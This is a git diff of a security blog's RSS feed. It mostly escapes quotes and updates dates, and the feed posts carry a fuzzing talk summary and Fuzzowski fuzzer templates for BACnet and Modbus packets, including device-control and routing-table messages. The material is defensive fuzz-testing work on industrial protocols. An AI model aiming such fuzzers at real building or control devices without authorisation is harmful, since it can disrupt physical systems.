@@ -5,15 +5,15 @@
     <description>M</description>
     <link>https://1modm.github.io/</link>
     <atom:link href="https://1modm.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 15 Mar 2022 09:18:36 +0000</pubDate>
-    <lastBuildDate>Tue, 15 Mar 2022 09:18:36 +0000</lastBuildDate>
-    <generator>Jekyll v4.1.1</generator>
+    <pubDate>Thu, 11 Jan 2024 14:31:57 +0000</pubDate>
+    <lastBuildDate>Thu, 11 Jan 2024 14:31:57 +0000</lastBuildDate>
+    <generator>Jekyll v3.9.0</generator>
     
       <item>
         <title>CorkSec Fuzzing Slides</title>
         <description>&lt;p&gt;Here can be found the slides I used during the &lt;a href=&quot;https://www.meetup.com/en-AU/CorkSec/events/280418335/&quot;&gt;CorkSec 101&lt;/a&gt; talk session on nov 2021.&lt;/p&gt;
 
-&lt;h1 id=&quot;corksec&quot;&gt;Cork|Sec&lt;/h1&gt;
+&lt;h2 id=&quot;corksec&quot;&gt;Cork|Sec&lt;/h2&gt;
 
 &lt;p&gt;Running since June 2013, every month we have 2 talks focused on Security or Technology - followed by socialising with like minded people – and you can find out exactly what to expect on the About Us section of our Meetup page. Past talk details are on our wiki on &lt;a href=&quot;http://corksec.com/&quot;&gt;CorkSec&lt;/a&gt;. All people with any sort of an interest or level of knowledge in Security, Hacking and Emerging Technology are more than welcome to attend and feel free to bring like minded colleagues and friends. CorkSec is a free event (free as in beer, and as in speech).&lt;/p&gt;
 
@@ -21,7 +21,7 @@
 
 &lt;p&gt;Fuzzing, the art of breaking things. Fuzzing is a technique for testing software using automated tools to provide invalid or unexpected input to a program or function in a program. The talk will give an understanding of what fuzzing is, and an introduction to fuzz testing concepts, strategy and techniques which goal is to find bugs. We will take some demos for code coverage for python and blackbox testing for the BACnet network protocol.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;/public/CorkSec-Fuzzing.pdf&quot;&gt;Fuzzing CorkSec 101 Slides&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://1modm.github.io/public/CorkSec-Fuzzing.pdf&quot;&gt;Fuzzing CorkSec 101 Slides&lt;/a&gt;&lt;/p&gt;
 </description>
         <pubDate>Mon, 20 Dec 2021 00:00:00 +0000</pubDate>
         <link>https://1modm.github.io/CorkSec.html</link>
@@ -351,46 +351,46 @@
 &lt;p&gt;Also some Codes, Functions and Services or Types have been defined in the BACnet fuzzer to be used by the methods defined:&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BVLC_Function_Code = [
-    '\x00',  # BVLC Result
-    '\x01',  # Write Broadcast Distribution Table 
-    '\x02',  # Read Broadcast Distribution Table 
-    '\x03',  # Read Broadcast Distribution Table ACK 
-    '\x04',  # Forwarded-NPDU
-    '\x05',  # Register Foreign Device
-    '\x0a',  # Original-Unicast-NPDU
-    '\x0b',  # Original-Broadcast-NPDU
-    '\x0c'   # Secure-BVLL 
+    &apos;\x00&apos;,  # BVLC Result
+    &apos;\x01&apos;,  # Write Broadcast Distribution Table 
+    &apos;\x02&apos;,  # Read Broadcast Distribution Table 
+    &apos;\x03&apos;,  # Read Broadcast Distribution Table ACK 
+    &apos;\x04&apos;,  # Forwarded-NPDU
+    &apos;\x05&apos;,  # Register Foreign Device
+    &apos;\x0a&apos;,  # Original-Unicast-NPDU
+    &apos;\x0b&apos;,  # Original-Broadcast-NPDU
+    &apos;\x0c&apos;   # Secure-BVLL 
 ]
 
 Confirmed_Service_Choices = [
-    '\x05',  # Subscribe COV
-    '\x0c',  # Read Property
-    '\x0e',  # Read Property Multiple
-    '\x0f',  # Write Property 
-    '\x10',  # Write Property Multiple
-    '\x11',  # Device Communication Control
-    '\x14'   # Reinitialize Device
+    &apos;\x05&apos;,  # Subscribe COV
+    &apos;\x0c&apos;,  # Read Property
+    &apos;\x0e&apos;,  # Read Property Multiple
+    &apos;\x0f&apos;,  # Write Property 
+    &apos;\x10&apos;,  # Write Property Multiple
+    &apos;\x11&apos;,  # Device Communication Control
+    &apos;\x14&apos;   # Reinitialize Device
 ]
 
 Network_Layer_Message_Type = [
-    '\x00',  # Who-Is-Router-To-Network
-    '\x01',  # I-Am-Router-To-Network
-    '\x02',  # I-Could-Be-Router-To-Network
-    '\x03',  # Reject-Message-To-Network
-    '\x04',  # Router-Busy-To-Network
-    '\x05',  # Router-Available-To-Network 
-    '\x06',  # Initialize-Routing-Table
-    '\x07',  # Initialize-Routing-Table-ACK
-    '\x08',  # Establish-Connection-To-Network
-    '\x09',  # Disconnect-Connection-To-Network
-    '\x0a',  # Challenge-Request
-    '\x0b',  # Security-Payload
-    '\x0c',  # Security-Response
-    '\x0d',  # Request-Key-Update
-    '\x0e',  # Update-Key-Set
-    '\x0f',  # Update-Distribution-Key
-    '\x10',  # Request-Master-Key
-    '\x11'  # Set-Master-Key
+    &apos;\x00&apos;,  # Who-Is-Router-To-Network
+    &apos;\x01&apos;,  # I-Am-Router-To-Network
+    &apos;\x02&apos;,  # I-Could-Be-Router-To-Network
+    &apos;\x03&apos;,  # Reject-Message-To-Network
+    &apos;\x04&apos;,  # Router-Busy-To-Network
+    &apos;\x05&apos;,  # Router-Available-To-Network 
+    &apos;\x06&apos;,  # Initialize-Routing-Table
+    &apos;\x07&apos;,  # Initialize-Routing-Table-ACK
+    &apos;\x08&apos;,  # Establish-Connection-To-Network
+    &apos;\x09&apos;,  # Disconnect-Connection-To-Network
+    &apos;\x0a&apos;,  # Challenge-Request
+    &apos;\x0b&apos;,  # Security-Payload
+    &apos;\x0c&apos;,  # Security-Response
+    &apos;\x0d&apos;,  # Request-Key-Update
+    &apos;\x0e&apos;,  # Update-Key-Set
+    &apos;\x0f&apos;,  # Update-Distribution-Key
+    &apos;\x10&apos;,  # Request-Master-Key
+    &apos;\x11&apos;  # Set-Master-Key
     # 0x12 to 0x7F Reserved for use by ASHRAE
     # 0x80 to 0xFF Available for Vendor Proprietary Messages
 ]
@@ -409,7 +409,7 @@ Network_Layer_Message_Type = [
     python -m fuzzowski 127.0.0.1 47808 -p udp -f bacnet -rt 0.5 -r DeviceCommunicationControl -m BACnetMon
     &quot;&quot;&quot;
 
-    name = 'bacnet'
+    name = &apos;bacnet&apos;
 
     @staticmethod
     def get_requests() -&amp;gt; List[callable]:
@@ -423,28 +423,28 @@ Network_Layer_Message_Type = [
         # Start DeviceCommunicationControl bacnet request packet
         s_initialize(&quot;DeviceCommunicationControl&quot;)
         with s_block(&quot;bacnet_virtual_link_control&quot;):
-            s_byte(0x81, name='type_bvlc', fuzzable=False)
-            s_byte(0x0a, name='function_bvlc', fuzzable=False)
-            s_word(0x0017, name='length_bvlc', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x81, name=&apos;type_bvlc&apos;, fuzzable=False)
+            s_byte(0x0a, name=&apos;function_bvlc&apos;, fuzzable=False)
+            s_word(0x0017, name=&apos;length_bvlc&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
         with s_block(&quot;bacnet_npdu&quot;):
-            s_byte(0x01, name='version_bacnet', fuzzable=False)
-            s_byte(0x04, name='control_bacnet', fuzzable=False)
+            s_byte(0x01, name=&apos;version_bacnet&apos;, fuzzable=False)
+            s_byte(0x04, name=&apos;control_bacnet&apos;, fuzzable=False)
         with s_block(&quot;bacnet_apdu&quot;):
-            s_byte(0x02, name='type_bacapp', fuzzable=True)
-            s_byte(0x44, name='max_adpu_size_bacapp', fuzzable=True)
-            s_byte(0x08, name='invoke_id_bacapp', fuzzable=True)
-            s_byte(0x11, name='confirmed_service_bacapp', fuzzable=True)
-            s_byte(0x0d, name='context_tag', fuzzable=True)
-            s_byte(0xff, name='tag_class', fuzzable=True)
-            s_byte(0x80, name='tag_number', fuzzable=True)
-            s_word(0x0000, name='enable', endian='&amp;gt;', fuzzable=True)
-            s_word(0x0000, name='passwd_length', endian='&amp;gt;', fuzzable=True)
-            s_byte(0x00, name='lvt', fuzzable=True)
-            s_dword(0x0a1a0300, name='lenght_value_type', endian='&amp;gt;', fuzzable=True)
-            s_word(0x1900, name='enable-disable', endian='&amp;gt;', fuzzable=True)
-            s_byte(0x2a, name='lvt_passwd', fuzzable=True)
-            s_byte(0x00, name='string_char_set', fuzzable=True)
-            s_string('A', name='passwd', fuzzable=True)
+            s_byte(0x02, name=&apos;type_bacapp&apos;, fuzzable=True)
+            s_byte(0x44, name=&apos;max_adpu_size_bacapp&apos;, fuzzable=True)
+            s_byte(0x08, name=&apos;invoke_id_bacapp&apos;, fuzzable=True)
+            s_byte(0x11, name=&apos;confirmed_service_bacapp&apos;, fuzzable=True)
+            s_byte(0x0d, name=&apos;context_tag&apos;, fuzzable=True)
+            s_byte(0xff, name=&apos;tag_class&apos;, fuzzable=True)
+            s_byte(0x80, name=&apos;tag_number&apos;, fuzzable=True)
+            s_word(0x0000, name=&apos;enable&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
+            s_word(0x0000, name=&apos;passwd_length&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
+            s_byte(0x00, name=&apos;lvt&apos;, fuzzable=True)
+            s_dword(0x0a1a0300, name=&apos;lenght_value_type&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
+            s_word(0x1900, name=&apos;enable-disable&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
+            s_byte(0x2a, name=&apos;lvt_passwd&apos;, fuzzable=True)
+            s_byte(0x00, name=&apos;string_char_set&apos;, fuzzable=True)
+            s_string(&apos;A&apos;, name=&apos;passwd&apos;, fuzzable=True)
         # end bacnet DeviceCommunicationControl
         # ---------------- DeviceCommunicationControl ------------------- #
         
@@ -452,18 +452,18 @@ Network_Layer_Message_Type = [
         # Start Who-Is bacnet request packet
         s_initialize(&quot;who_is&quot;)
         with s_block(&quot;bacnet_virtual_link_control&quot;):
-            s_byte(0x81, name='type_bvlc', fuzzable=False)
-            s_byte(0x0b, name='function_bvlc', fuzzable=False)
-            s_word(0x000c, name='length_bvlc', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x81, name=&apos;type_bvlc&apos;, fuzzable=False)
+            s_byte(0x0b, name=&apos;function_bvlc&apos;, fuzzable=False)
+            s_word(0x000c, name=&apos;length_bvlc&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
         with s_block(&quot;bacnet_npdu&quot;):
-            s_byte(0x01, name='version_bacnet', fuzzable=True)
-            s_byte(0x20, name='control_bacnet', fuzzable=True)
-            s_word(0xffff, name='detination', endian='&amp;gt;', fuzzable=True)
-            s_byte(0x00, name='mac', fuzzable=True)
-            s_byte(0xff, name='hop', fuzzable=True)
+            s_byte(0x01, name=&apos;version_bacnet&apos;, fuzzable=True)
+            s_byte(0x20, name=&apos;control_bacnet&apos;, fuzzable=True)
+            s_word(0xffff, name=&apos;detination&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
+            s_byte(0x00, name=&apos;mac&apos;, fuzzable=True)
+            s_byte(0xff, name=&apos;hop&apos;, fuzzable=True)
         with s_block(&quot;bacnet_apdu&quot;):
-            s_byte(0x10, name='type_bacapp', fuzzable=True)
-            s_byte(0x08, name='confirmed_service_bacapp', fuzzable=True)
+            s_byte(0x10, name=&apos;type_bacapp&apos;, fuzzable=True)
+            s_byte(0x08, name=&apos;confirmed_service_bacapp&apos;, fuzzable=True)
         # end
         # ------------------------- Who-Is ------------------------------ #
 
@@ -471,14 +471,14 @@ Network_Layer_Message_Type = [
         # Start Initialize_Routing_Table bacnet request packet
         s_initialize(&quot;Initialize_Routing_Table&quot;)
         with s_block(&quot;bacnet_virtual_link_control&quot;):
-            s_byte(0x81, name='type_bvlc', fuzzable=False)
-            s_byte(0x0b, name='function_bvlc', fuzzable=False)
-            s_word(0x0008, name='length_bvlc', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x81, name=&apos;type_bvlc&apos;, fuzzable=False)
+            s_byte(0x0b, name=&apos;function_bvlc&apos;, fuzzable=False)
+            s_word(0x0008, name=&apos;length_bvlc&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
         with s_block(&quot;bacnet_npdu&quot;):
-            s_byte(0x01, name='version_bacnet', fuzzable=True)
-            s_byte(0x80, name='control_bacnet', fuzzable=True)
-            s_byte(0x06, name='message_type', fuzzable=True)
-            s_byte(0x00, name='rpot_number', fuzzable=True)
+            s_byte(0x01, name=&apos;version_bacnet&apos;, fuzzable=True)
+            s_byte(0x80, name=&apos;control_bacnet&apos;, fuzzable=True)
+            s_byte(0x06, name=&apos;message_type&apos;, fuzzable=True)
+            s_byte(0x00, name=&apos;rpot_number&apos;, fuzzable=True)
         # end
         # ------------------- Initialize_Routing_Table ------------------ #
 
@@ -487,13 +487,13 @@ Network_Layer_Message_Type = [
         # Start Who_Is_Router_To_Network bacnet request packet 
         s_initialize(&quot;Who_Is_Router_To_Network&quot;)
         with s_block(&quot;bacnet_virtual_link_control&quot;):
-            s_byte(0x81, name='type_bvlc', fuzzable=False)
-            s_byte(0x0b, name='function_bvlc', fuzzable=False)
-            s_word(0x0007, name='length_bvlc', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x81, name=&apos;type_bvlc&apos;, fuzzable=False)
+            s_byte(0x0b, name=&apos;function_bvlc&apos;, fuzzable=False)
+            s_word(0x0007, name=&apos;length_bvlc&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
         with s_block(&quot;bacnet_npdu&quot;):
-            s_byte(0x01, name='version_bacnet', fuzzable=True)
-            s_byte(0x80, name='control_bacnet', fuzzable=True)
-            s_byte(0x00, name='message_type', fuzzable=True)
+            s_byte(0x01, name=&apos;version_bacnet&apos;, fuzzable=True)
+            s_byte(0x80, name=&apos;control_bacnet&apos;, fuzzable=True)
+            s_byte(0x00, name=&apos;message_type&apos;, fuzzable=True)
         # end
         # ------------------ Who_Is_Router_To_Network ------------------- #
         
@@ -501,29 +501,29 @@ Network_Layer_Message_Type = [
         # Start i-Am bacnet request packet 
         s_initialize(&quot;i_Am&quot;)
         with s_block(&quot;bacnet_virtual_link_control&quot;):
-            s_byte(0x81, name='type_bvlc', fuzzable=False)
-            s_byte(0x0b, name='function_bvlc', fuzzable=False)
-            s_word(0x0018, name='length_bvlc', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x81, name=&apos;type_bvlc&apos;, fuzzable=False)
+            s_byte(0x0b, name=&apos;function_bvlc&apos;, fuzzable=False)
+            s_word(0x0018, name=&apos;length_bvlc&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
         with s_block(&quot;bacnet_npdu&quot;):
-            s_byte(0x01, name='version_bacnet', fuzzable=True)
-            s_byte(0x20, name='control_bacnet', fuzzable=True)
-            s_word(0xffff, name='destination', endian='&amp;gt;', fuzzable=True)
-            s_byte(0x00, name='destination_mac', fuzzable=True)
-            s_byte(0xff, name='hop_count', fuzzable=True)
+            s_byte(0x01, name=&apos;version_bacnet&apos;, fuzzable=True)
+            s_byte(0x20, name=&apos;control_bacnet&apos;, fuzzable=True)
+            s_word(0xffff, name=&apos;destination&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
+            s_byte(0x00, name=&apos;destination_mac&apos;, fuzzable=True)
+            s_byte(0xff, name=&apos;hop_count&apos;, fuzzable=True)
         with s_block(&quot;bacnet_apdu&quot;):
-            s_byte(0x10, name='type_bacapp', fuzzable=True)
-            s_byte(0x00, name='confirmed_service_bacapp', fuzzable=True)
+            s_byte(0x10, name=&apos;type_bacapp&apos;, fuzzable=True)
+            s_byte(0x00, name=&apos;confirmed_service_bacapp&apos;, fuzzable=True)
             # deviceID
-            s_byte(0xc4, name='ObjectIdentifier_device', fuzzable=True)
-            s_byte(0x02, name='ObjectIdentifier_instance_number', fuzzable=True)
-            s_byte(DeviceID_byte1, name='ObjectIdentifier_deviceID_byte1', fuzzable=True)
-            s_byte(DeviceID_byte2, name='ObjectIdentifier_deviceID_byte2', fuzzable=True)
-            s_byte(DeviceID_byte3, name='ObjectIdentifier_deviceID_byte3', fuzzable=True)
+            s_byte(0xc4, name=&apos;ObjectIdentifier_device&apos;, fuzzable=True)
+            s_byte(0x02, name=&apos;ObjectIdentifier_instance_number&apos;, fuzzable=True)
+            s_byte(DeviceID_byte1, name=&apos;ObjectIdentifier_deviceID_byte1&apos;, fuzzable=True)
+            s_byte(DeviceID_byte2, name=&apos;ObjectIdentifier_deviceID_byte2&apos;, fuzzable=True)
+            s_byte(DeviceID_byte3, name=&apos;ObjectIdentifier_deviceID_byte3&apos;, fuzzable=True)
             # deviceID
-            s_byte(0x22, name='lvt', fuzzable=True)
-            s_word(0x0400, name='max_adpu_size_bacapp', endian='&amp;gt;', fuzzable=True)
-            s_word(0x9100, name='segmented_both', endian='&amp;gt;', fuzzable=True)
-            s_word(0x2105, name='vendor_id', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x22, name=&apos;lvt&apos;, fuzzable=True)
+            s_word(0x0400, name=&apos;max_adpu_size_bacapp&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
+            s_word(0x9100, name=&apos;segmented_both&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
+            s_word(0x2105, name=&apos;vendor_id&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
         # end
         # ---------------------------- i-Am ----------------------------- #
         
@@ -531,24 +531,24 @@ Network_Layer_Message_Type = [
         # Start readProperty bacnet request packet
         s_initialize(&quot;readProperty&quot;)
         with s_block(&quot;bacnet_virtual_link_control&quot;):
-            s_byte(0x81, name='type_bvlc', fuzzable=False)
-            s_byte(0x0b, name='function_bvlc', fuzzable=False)
-            s_word(0x0011, name='length_bvlc', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x81, name=&apos;type_bvlc&apos;, fuzzable=False)
+            s_byte(0x0b, name=&apos;function_bvlc&apos;, fuzzable=False)
+            s_word(0x0011, name=&apos;length_bvlc&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
         with s_block(&quot;bacnet_npdu&quot;):
-            s_byte(0x01, name='version', fuzzable=False)
-            s_byte(0x04, name='control', fuzzable=False)
+            s_byte(0x01, name=&apos;version&apos;, fuzzable=False)
+            s_byte(0x04, name=&apos;control&apos;, fuzzable=False)
         with s_block(&quot;bacnet_apdu&quot;):
-            s_byte(0x02, name='type_bacapp', fuzzable=False)
-            s_byte(0x44, name='max_adpu_size_bacapp', fuzzable=True)
-            s_byte(0x03, name='invoke_id_bacapp', fuzzable=True)
-            s_byte(0x0c, name='confirmed_service_bacapp', fuzzable=True)
+            s_byte(0x02, name=&apos;type_bacapp&apos;, fuzzable=False)
+            s_byte(0x44, name=&apos;max_adpu_size_bacapp&apos;, fuzzable=True)
+            s_byte(0x03, name=&apos;invoke_id_bacapp&apos;, fuzzable=True)
+            s_byte(0x0c, name=&apos;confirmed_service_bacapp&apos;, fuzzable=True)
             # deviceID
-            s_byte(0x0c, name='ObjectIdentifier_deviceID', fuzzable=True)
-            s_byte(0x02, name='ObjectIdentifier_instance_number', fuzzable=True)
-            s_byte(DeviceID_byte1, name='ObjectIdentifier_deviceID_byte1', fuzzable=True)
-            s_byte(DeviceID_byte2, name='ObjectIdentifier_deviceID_byte2', fuzzable=True)
-            s_byte(DeviceID_byte3, name='ObjectIdentifier_deviceID_byte3', fuzzable=True)
-            s_word(0x194b, name='property_identifier_bacapp', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x0c, name=&apos;ObjectIdentifier_deviceID&apos;, fuzzable=True)
+            s_byte(0x02, name=&apos;ObjectIdentifier_instance_number&apos;, fuzzable=True)
+            s_byte(DeviceID_byte1, name=&apos;ObjectIdentifier_deviceID_byte1&apos;, fuzzable=True)
+            s_byte(DeviceID_byte2, name=&apos;ObjectIdentifier_deviceID_byte2&apos;, fuzzable=True)
+            s_byte(DeviceID_byte3, name=&apos;ObjectIdentifier_deviceID_byte3&apos;, fuzzable=True)
+            s_word(0x194b, name=&apos;property_identifier_bacapp&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
         # end
         # ------------------------- readProperty ------------------------ #
 
@@ -556,26 +556,26 @@ Network_Layer_Message_Type = [
         # Start atomicReadFile bacnet request packet
         s_initialize(&quot;atomicReadFile&quot;)
         with s_block(&quot;bacnet_virtual_link_control&quot;):
-            s_byte(0x81, name='type_bvlc', fuzzable=False)
-            s_byte(0x0a, name='function_bvlc', fuzzable=False)
-            s_word(0x001b, name='length_bvlc', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x81, name=&apos;type_bvlc&apos;, fuzzable=False)
+            s_byte(0x0a, name=&apos;function_bvlc&apos;, fuzzable=False)
+            s_word(0x001b, name=&apos;length_bvlc&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
         with s_block(&quot;bacnet_npdu&quot;):
-            s_byte(0x01, name='version', fuzzable=False)
-            s_byte(0x04, name='control', fuzzable=False)
+            s_byte(0x01, name=&apos;version&apos;, fuzzable=False)
+            s_byte(0x04, name=&apos;control&apos;, fuzzable=False)
         with s_block(&quot;bacnet_apdu&quot;):
-            s_byte(0x00, name='type_bacapp', fuzzable=False)
-            s_byte(0x05, name='max_adpu_size_bacapp', fuzzable=True)
-            s_byte(0x01, name='invoke_id_bacapp', fuzzable=True)
-            s_byte(0x06, name='confirmed_service_bacapp', fuzzable=True)
+            s_byte(0x00, name=&apos;type_bacapp&apos;, fuzzable=False)
+            s_byte(0x05, name=&apos;max_adpu_size_bacapp&apos;, fuzzable=True)
+            s_byte(0x01, name=&apos;invoke_id_bacapp&apos;, fuzzable=True)
+            s_byte(0x06, name=&apos;confirmed_service_bacapp&apos;, fuzzable=True)
             # file
-            s_dword(0xc4028000, name='file', endian='&amp;gt;', fuzzable=True)
-            s_byte(0x00, name='ObjectIdentifier', fuzzable=True)
+            s_dword(0xc4028000, name=&apos;file&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
+            s_byte(0x00, name=&apos;ObjectIdentifier&apos;, fuzzable=True)
             # stream
-            s_word(0x0e35, name='named_tag', endian='&amp;gt;', fuzzable=True)
-            s_dword(0xffdf62ee, name='lvt', endian='&amp;gt;', fuzzable=True)
-            s_byte(0x00, name='ObjectIdentifier_2', fuzzable=True)
-            s_dword(0x00220584, name='text', endian='&amp;gt;', fuzzable=True)
-            s_byte(0x0f, name='named_tag_2', fuzzable=True)
+            s_word(0x0e35, name=&apos;named_tag&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
+            s_dword(0xffdf62ee, name=&apos;lvt&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
+            s_byte(0x00, name=&apos;ObjectIdentifier_2&apos;, fuzzable=True)
+            s_dword(0x00220584, name=&apos;text&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
+            s_byte(0x0f, name=&apos;named_tag_2&apos;, fuzzable=True)
         # end
         # ------------------------- atomicReadFile ----------------------- #
 
@@ -583,26 +583,26 @@ Network_Layer_Message_Type = [
         # Start atomicWriteFile bacnet request packet
         s_initialize(&quot;atomicWriteFile&quot;)
         with s_block(&quot;bacnet_virtual_link_control&quot;):
-            s_byte(0x81, name='type_bvlc', fuzzable=False)
-            s_byte(0x0a, name='function_bvlc', fuzzable=False)
-            s_word(0x001b, name='length_bvlc', endian='&amp;gt;', fuzzable=True)
+            s_byte(0x81, name=&apos;type_bvlc&apos;, fuzzable=False)
+            s_byte(0x0a, name=&apos;function_bvlc&apos;, fuzzable=False)
+            s_word(0x001b, name=&apos;length_bvlc&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
         with s_block(&quot;bacnet_npdu&quot;):
-            s_byte(0x01, name='version', fuzzable=False)
-            s_byte(0x04, name='control', fuzzable=False)
+            s_byte(0x01, name=&apos;version&apos;, fuzzable=False)
+            s_byte(0x04, name=&apos;control&apos;, fuzzable=False)
         with s_block(&quot;bacnet_apdu&quot;):
-            s_byte(0x00, name='type_bacapp', fuzzable=False)
-            s_byte(0x05, name='max_adpu_size_bacapp', fuzzable=True)
-            s_byte(0x02, name='invoke_id_bacapp', fuzzable=True)
-            s_byte(0x07, name='confirmed_service_bacapp', fuzzable=True)
+            s_byte(0x00, name=&apos;type_bacapp&apos;, fuzzable=False)
+            s_byte(0x05, name=&apos;max_adpu_size_bacapp&apos;, fuzzable=True)
+            s_byte(0x02, name=&apos;invoke_id_bacapp&apos;, fuzzable=True)
+            s_byte(0x07, name=&apos;confirmed_service_bacapp&apos;, fuzzable=True)
             # file
-            s_dword(0xc4028000, name='file', endian='&amp;gt;', fuzzable=True)
-            s_byte(0x00, name='ObjectIdentifier', fuzzable=True)
+            s_dword(0xc4028000, name=&apos;file&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
+            s_byte(0x00, name=&apos;ObjectIdentifier&apos;, fuzzable=True)
             # stream
-            s_word(0x0e35, name='named_tag', endian='&amp;gt;', fuzzable=True)
-            s_dword(0xff5ed5c0, name='lvt', endian='&amp;gt;', fuzzable=True)
-            s_byte(0x85, name='ObjectIdentifier_2', fuzzable=True)
-            s_dword(0x0a62640a, name='text', endian='&amp;gt;', fuzzable=True)
-            s_byte(0x0f, name='named_tag_2', fuzzable=True)
+            s_word(0x0e35, name=&apos;named_tag&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
+            s_dword(0xff5ed5c0, name=&apos;lvt&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
+            s_byte(0x85, name=&apos;ObjectIdentifier_2&apos;, fuzzable=True)
+            s_dword(0x0a62640a, name=&apos;text&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
+            s_byte(0x0f, name=&apos;named_tag_2&apos;, fuzzable=True)
         # end
         # ------------------------- atomicWriteFile ---------------------- #
 
@@ -669,7 +669,7 @@ Network_Layer_Message_Type = [
                 result = False
             else:
                 # validate valid BACNet Packet and verify that the response APDU was not an error packet
-                if hex(data[0]) == '0x81' and hex(data[1]) == '0xa' and hex(data[6]) != '0x50':
+                if hex(data[0]) == &apos;0x81&apos; and hex(data[1]) == &apos;0xa&apos; and hex(data[6]) != &apos;0x50&apos;:
                   self.logger.log_info(f&quot;Getting BACnet device information succeeded&quot;)
                 else:
                   self.logger.log_warn(f&quot;Getting BACnet error response in the APDU&quot;)
@@ -714,7 +714,7 @@ Network_Layer_Message_Type = [
 
     # --------------------------------------------------------------- #
 
-    name = 'modbus'
+    name = &apos;modbus&apos;
 
     @staticmethod
     def get_requests() -&amp;gt; List[callable]:
@@ -729,235 +729,235 @@ Network_Layer_Message_Type = [
 
         s_initialize(&quot;modbus_read_coil&quot;)
         with s_block(&quot;modbus_head&quot;):
-            s_word(0x0001,name='transId',fuzzable=True)
-            s_word(0x0000,name='protoId',fuzzable=False)
-            s_word(0x06,name='length')
-            s_byte(0xff,name='unit Identifier',fuzzable=False)
-            with s_block('pdu'):
-                s_byte(0x01,name='funcCode read coil memory',fuzzable=False)
-                s_word(0x0000,name='start address')
-                s_word(0x0000,name='quantity')
+            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
+            s_word(0x0000,name=&apos;protoId&apos;,fuzzable=False)
+            s_word(0x06,name=&apos;length&apos;)
+            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
+            with s_block(&apos;pdu&apos;):
+                s_byte(0x01,name=&apos;funcCode read coil memory&apos;,fuzzable=False)
+                s_word(0x0000,name=&apos;start address&apos;)
+                s_word(0x0000,name=&apos;quantity&apos;)
         
 
-        s_initialize('read_holding_registers')
+        s_initialize(&apos;read_holding_registers&apos;)
         with s_block(&quot;modbus_head&quot;):
-            s_word(0x0001,name='transId',fuzzable=True)
-            s_word(0x0002,name='protoId',fuzzable=False)
-            s_word(0x06,name='length')
-            s_byte(0xff,name='unit Identifier',fuzzable=False)
-            with s_block('read_holding_registers_block'):
-                s_byte(0x01,name='read_holding_registers')
-                s_word(0x0000,name='start address')
-                s_word(0x0000,name='quantity')
+            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
+            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
+            s_word(0x06,name=&apos;length&apos;)
+            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
+            with s_block(&apos;read_holding_registers_block&apos;):
+                s_byte(0x01,name=&apos;read_holding_registers&apos;)
+                s_word(0x0000,name=&apos;start address&apos;)
+                s_word(0x0000,name=&apos;quantity&apos;)
         # --------------------------------------------------------------- #
 
 
         # ------------------ Read Input Status (FC=02) ------------------ #
-        s_initialize('ReadDiscreteInputs')
+        s_initialize(&apos;ReadDiscreteInputs&apos;)
         with s_block(&quot;modbus_head&quot;):
-            s_word(0x0001,name='transId',fuzzable=True)
-            s_word(0x0002,name='protoId',fuzzable=False)
-            s_word(0x06,name='length')
-            s_byte(0xff,name='unit Identifier',fuzzable=False)
-            with s_block('ReadDiscreteInputsRequest'):
-                s_byte(0x02,name='funcCode',fuzzable=False)
-                s_word(0x0000,name='start_address')
-                s_word(0x0000,name='quantity')
+            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
+            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
+            s_word(0x06,name=&apos;length&apos;)
+            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
+            with s_block(&apos;ReadDiscreteInputsRequest&apos;):
+                s_byte(0x02,name=&apos;funcCode&apos;,fuzzable=False)
+                s_word(0x0000,name=&apos;start_address&apos;)
+                s_word(0x0000,name=&apos;quantity&apos;)
         # --------------------------------------------------------------- #
 
         # ---------------- Read Holding Registers (FC=03) --------------- #
-        s_initialize('ReadHoldingRegisters')
+        s_initialize(&apos;ReadHoldingRegisters&apos;)
